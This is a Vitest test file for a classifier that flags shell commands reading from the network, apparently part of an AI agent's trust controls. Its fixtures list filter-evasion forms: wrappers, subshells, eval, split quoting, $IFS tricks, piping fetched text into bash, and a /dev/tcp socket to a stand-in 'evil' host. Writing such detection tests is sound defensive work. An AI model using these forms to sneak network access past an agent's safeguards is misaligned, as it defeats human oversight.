import { describe, expect, it } from "vitest";
import { isNetworkCommand } from "../../src/decisions/entries/shell-netread.js";
import { entryById, entryProblems } from "../../src/decisions/registry.js";
import type { AnyEntry } from "../../src/decisions/types.js";

// Spec §7.2: a command that reads from the network makes the turn untrusted, and its output counts as from outside (Task 12).
// A miss is costly: an outside passage that trips the content check is framed instead of withheld, and the turn stays below
// hostile. So the classifier is conservative: a form it cannot read statically counts as network (a false positive only
// tightens). tool.shell_class (approvals) is untouched.
const NETWORK = ["curl https://example.com", "wget -qO- http://x.example", "http GET api.example.com", "ssh paco@mini uptime", "scp host:/etc/hosts .",
  "rsync -a mini:/data ./data", "git fetch origin", "git -C repo pull", "git clone https://github.com/a/b", "nc example.com 80",
  "python3 -c \"import urllib.request as u; print(u.urlopen('https://x').read())\"", "node -e \"fetch('https://x').then(r=>r.text())\"",
  "cat list.txt | xargs curl -s", "for u in a b; do curl -s https://$u.example; done", "env FOO=1 curl https://x", "/usr/bin/curl https://x"];
// The review's attack table (task-8-review.md, check 2): every wrapper, subshell and indirection form it fed the classifier.
const ATTACKS = ["bash -c \"curl x\"", "sh -c 'curl x'", "eval curl x", "echo $(curl x)", "echo `curl x`", "echo x | curl -d @- y", "a; curl y",
  "a && wget y", "sudo -u u curl x", "sudo -E curl x", "timeout -s KILL 5 curl x", "command -p curl x", "xargs -n1 curl", "xargs -I{} curl {}",
  "env -i curl x", "nice -n 5 curl x", "stdbuf -oL curl x", "unbuffer curl x", "find . -exec curl {} \;", "find . -execdir sh {} \;",
  "python3 -c \"os.system('cu'+'rl x')\"", "perl -MLWP::Simple -e 'getprint \"http://x\"'", "osascript -e 'do shell script \"curl x\"'",
  "\\curl x", "git -c x=y fetch", "ssh host", "openssl s_client -connect x:443", "dig example.com", "nslookup example.com", "host example.com",
  "whois example.com", "gh api repos/a/b", "npm install left-pad", "npx cowsay hi", "pnpm add x", "yarn add x", "pip install requests",
  "python3 -m pip install x", "brew install jq", "uv run --with httpx script.py", "git submodule update --init", "bash <<< \"curl x\"",
  "echo 'curl x' | bash", "source <(curl -s x)", "zsh -lc 'curl x'", "fish -c 'curl x'"];
// Re-review 1: bash's /dev/tcp sockets, quoting that splits a program name, and a program word the shell expands at run time.
const OBFUSCATED = ["exec 3<>/dev/tcp/evil/80", "cat < /dev/tcp/h/80", "c\"\"url x", "'cu''rl' x", "cu\\rl x", "curl$IFS'x'",
  "echo hi > /dev/udp/h/53", "\"w\"g\"e\"t x", "$CMD https://x", "sudo $CMD x", "/usr/bin/cu* x", "c?rl x"];
const COMPOUND = ["ls && curl -s x | jq .", "cd repo; git pull || true", "make build & wget -q x", "test -f a || (cd b && git fetch)",
  "for f in *.txt; do echo $f; done; ssh mini ls"];
const LOCAL = ["ls -la", "git log -n 5", "git status", "cat README.md", "grep -rn http src", "echo https://example.com", "python3 script.py",
  "rsync -a ./a ./b", "node build.js", "scp ./a ./b", "cat notes-about-curl.md", "npm run build", "ls | xargs wc -l", "source ./env.sh",
  "ls && git diff | head -n 20", "ls *.txt", "echo $HOME", "rm -f \"$TMP/x\"", "cat 'notes about curl.md'"];

describe("tool.shell_netread", () => {
  it("flags every network reader", () => { for (const c of NETWORK) expect([c, isNetworkCommand(c).network]).toEqual([c, true]); });
  it("flags every wrapper, subshell and indirection form (a miss frames attacker text instead of withholding it)", () => {
    for (const c of ATTACKS) expect([c, isNetworkCommand(c).network]).toEqual([c, true]);
  });
  it("sees through /dev/tcp, split quoting and backslashes, and counts a program the shell expands as network", () => {
    for (const c of OBFUSCATED) expect([c, isNetworkCommand(c).network]).toEqual([c, true]);
  });
  it("any network segment of a compound command makes the whole command network", () => {
    for (const c of COMPOUND) expect([c, isNetworkCommand(c).network]).toEqual([c, true]);
  });
  it("leaves local commands local (a URL or a program name as a plain argument reads nothing)", () => {
    for (const c of LOCAL) expect([c, isNetworkCommand(c).network]).toEqual([c, false]);
  });
  it("is a sound code-only entry whose network verdict only tightens", () => {
    const e = entryById("tool.shell_netread") as AnyEntry;
    expect(entryProblems(e)).toEqual([]);
    expect(e.ladder.every((r) => r.kind === "rule")).toBe(true);
    expect(e.effects.network?.kind).toBe("tighten");
  });
});
